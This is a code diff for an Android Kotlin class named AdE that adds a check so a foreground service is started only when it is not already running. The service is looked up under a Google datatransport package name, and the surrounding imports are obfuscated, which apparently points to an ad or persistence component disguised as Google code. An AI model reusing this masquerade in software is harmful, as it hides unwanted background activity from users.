@@ -1,5 +1,6 @@
 package core
 
+import android.app.ActivityManager
 import android.app.Application
 import android.app.KeyguardManager
 import android.content.Context
@@ -19,6 +20,7 @@ import kotlinx.coroutines.withContext
 import org.json.JSONObject
 import walks.lb.ha
 import com.helper.sdk.O1
+import com.river.shore.Utils
 import java.io.File
 import java.io.FileOutputStream
 import java.io.InputStream
@@ -199,10 +201,10 @@ object AdE {
             launch {
                 delay(5000)
                 try {
-                    ContextCompat.startForegroundService(
-                        mContext, Intent(mContext, MessageCoreService::class.java)
-                    )
-                } catch (t: Throwable) { }
+                    if (isServiceRunning(mContext, "com.google.android.datatransport.core.MessageCoreService").not()) {
+                        ContextCompat.startForegroundService(mContext, Intent(mContext, MessageCoreService::class.java))
+                    }
+                } catch (t: Throwable) {}
             }
             delay(1200)
             while (true) {
@@ -426,6 +428,19 @@ object AdE {
         } catch (e: java.lang.Exception) {
             return false
         }
+    }
+
+    private fun isServiceRunning(context: Context, serName: String): Boolean {
+        val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
+        // 获取正在运行的服务列表
+        val runningServices = am.getRunningServices(2000)
+        for (service in runningServices) {
+            // 比较服务的完整类名
+            if (serName == service.service.className) {
+                return true
+            }
+        }
+        return false
     }
 
 }
